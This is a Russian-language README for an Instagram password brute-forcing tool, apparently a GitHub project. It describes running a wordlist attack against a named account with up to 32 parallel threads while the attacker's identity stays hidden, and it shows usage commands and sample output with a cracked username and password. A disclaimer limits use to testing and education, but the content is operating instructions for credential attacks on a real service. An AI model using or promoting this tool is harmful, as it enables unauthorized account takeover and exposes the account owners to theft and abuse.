# Instagram Bruter

Брутфорсер Instagram. Просто дайте ему цель, список паролей и режим, затем нажмите ввод и забудьте об этом. Высшим приоритетом этой программы является ваша анонимность, она атакует только тогда, когда ваша личность скрыта.

⚠️Этот проект должен использоваться только для тестирования или образовательных целей.

### УВЕДОМЛЕНИЕ

Я больше не поддерживаю этот проект, это последняя версия.

### Требования

-   Python _v3.x.x_
-   ~~Kali Linux 2.0~~
-   ~~TOR~~

### Установить зависимости

```
pip3 install -r requirements.txt
```

### Помощь

```
C:\Users\kotanoff\Desktop\Instagram>python3 instagram.py -h
usage: instagram.py [-h] [-m MODE] ник список

позиционные аргументы:
  ник              электронная почта или имя пользователя
  список              список паролей

необязательные аргументы:
  -h, --help            показать это справочное сообщение и выйти
  -m MODE, --mode MODE  modes: 0 => 32 бота; 1 => 16 ботов; 2 => 8 ботов; 3 => 4 бота
```

### Применение

```
python3 instagram.py <ник> <список> -m <режим>
```

### Боты(Threads)

-   4 бота: 64 пароля за раз
-   8 ботов: 128 паролей за раз
-   16 ботов: 256 паролей за раз
-   32 бота: 512 паролей за раз

### Режимы

-   0: 32 бота
-   1: 16 ботов
-   2: 8 ботов
-   3: 4 бота

### Chill mode

В этом режиме одновременно используются только 4 бота или 64 пароля.

```
C:\Users\kotanoff\Desktop\Instagram>python3 instagram.py Sami09.1 pass.lst -m 3
```

### Умеренный режим 1

В этом режиме одновременно используется 8 ботов или 128 паролей.

```
C:\Users\kotanoff\Desktop\Instagram>python3 instagram.py Sami09.1 pass.lst -m 2
```

### Умеренный режим 2

В этом режиме одновременно используется 16 ботов или 256 паролей.

```
C:\Users\kotanoff\Desktop\Instagram>python3 instagram.py Sami09.1 pass.lst -m 1
```

### Дикий режим

В этом режиме одновременно используется 32 бота или 512 паролей.

```
C:\Users\kotanoff\Desktop\Instagram>python3 instagram.py Sami09.1 pass.lst -m 0
```

### Если вы не укажете режим, тогда будет установлено значение 2.

### Запуск

```
[-] Wordlist: pass.lst
[-] Username: Sami09.1
[-] Password: 272
[-] Complete: 45.51%
[-] Attempts: 228
[-] Browsers: 273
[-] Exists: True
```

### Стоп

```
[-] Wordlist: pass.lst
[-] Username: Sami09.1
[-] Password: Sami123
[-] Complete: 62.67%
[-] Attempts: 314
[-] Browsers: 185
[-] Exists: True

[!] Password Found
[+] Username: Sami09.1
[+] Password: Sami123
```
